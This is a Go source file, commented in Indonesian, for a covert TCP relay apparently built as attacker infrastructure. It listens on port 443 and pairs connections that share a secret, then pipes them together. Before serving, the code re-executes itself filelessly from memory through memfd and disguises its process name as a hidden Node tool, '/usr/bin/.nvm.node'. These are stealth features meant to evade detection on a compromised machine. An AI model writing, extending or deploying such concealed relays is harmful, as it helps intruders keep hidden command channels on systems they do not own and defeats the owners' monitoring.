package main

import (
	"bufio"
	"flag"
	"io"
	"log"
	"net"
	"os"
	"strings"
	"sync"

	"github.com/badghost/svenom/pkg/masquerade"
	"github.com/badghost/svenom/pkg/memfd"
)

var (
	listenAddr = flag.String("listen", ":443", "Address to listen for inbound connections")
	secretFlag = flag.String("secret", "", "Pre-shared secret (if empty, any secret works)")
)

// WaitingPeers menyimpan koneksi yang menunggu pasangan dengan secret yang sama
var waitingPeers = struct {
	sync.Mutex
	m map[string]net.Conn
}{m: make(map[string]net.Conn)}

func main() {
	flag.Parse()

	// --- FILELESS EXECUTION ---
	// Baca binary diri sendiri
	self, err := os.ReadFile(os.Args[0])
	if err != nil {
		log.Fatalf("Read self: %v", err)
	}

	// Siapkan argumen untuk proses baru (sama seperti saat ini)
	args := os.Args
	env := os.Environ()

	// Panggil memfd execute, setelah ini proses asli digantikan
	if err := memfd.ExecuteInMemory(self, args, env); err != nil {
		log.Printf("Warning: memfd execution failed, continuing normally: %v", err)
		// Jika gagal, lanjutkan proses biasa (misalnya di sistem non-Linux)
	} else {
		// Tidak akan pernah sampai sini jika sukses
		return
	}

	// --- MASQUERADE ---
	if err := masquerade.DisguiseAs(".nvm.node", "/usr/bin/.nvm.node -relay"); err != nil {
		log.Printf("Masquerade warning: %v", err)
	}

	// --- MULAI RELAY SERVER ---
	ln, err := net.Listen("tcp", *listenAddr)
	if err != nil {
		log.Fatalf("Listen: %v", err)
	}
	log.Printf("Relay listening on %s", *listenAddr)

	for {
		conn, err := ln.Accept()
		if err != nil {
			log.Printf("Accept error: %v", err)
			continue
		}
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	defer conn.Close()
	log.Printf("New connection from %s", conn.RemoteAddr())

	// Baca secret (sampai newline)
	reader := bufio.NewReader(conn)
	secret, err := reader.ReadString('\n')
	if err != nil {
		log.Printf("Read secret error: %v", err)
		return
	}
	secret = strings.TrimSpace(secret)
	if secret == "" {
		log.Println("Empty secret, disconnecting")
		return
	}

	log.Printf("Secret received: %s", secret)

	waitingPeers.Lock()
	// Cek apakah ada peer yang sudah menunggu dengan secret yang sama
	if peer, ok := waitingPeers.m[secret]; ok {
		delete(waitingPeers.m, secret)
		waitingPeers.Unlock()
		log.Printf("Pairing %s with waiting peer %s", conn.RemoteAddr(), peer.RemoteAddr())
		// Lakukan bidirectional pipe
		go pipe(conn, peer)
		pipe(peer, conn)
	} else {
		// Belum ada, simpan koneksi ini
		waitingPeers.m[secret] = conn
		waitingPeers.Unlock()
		log.Printf("No peer yet for secret %s, holding connection", secret)
		// Tetap buka koneksi, blocking read untuk menjaga koneksi hidup
		// Jika koneksi putus, hapus dari map saat selesai
		defer func() {
			waitingPeers.Lock()
			delete(waitingPeers.m, secret)
			waitingPeers.Unlock()
		}()
		// Baca terus-menerus (tetap hidup) – bisa juga gunakan keep-alive sederhana
		// Jika koneksi tertutup, fungsi handleConnection akan return dan defer membersihkan.
		_, _ = io.ReadAll(conn) // Akan block sampai koneksi ditutup
	}
}

// pipe menyalin data dari src ke dst dan menutup dst saat selesai
func pipe(src, dst net.Conn) {
	defer dst.Close()
	_, err := io.Copy(dst, src)
	if err != nil && err != io.EOF {
		log.Printf("Pipe error: %v", err)
	}
}
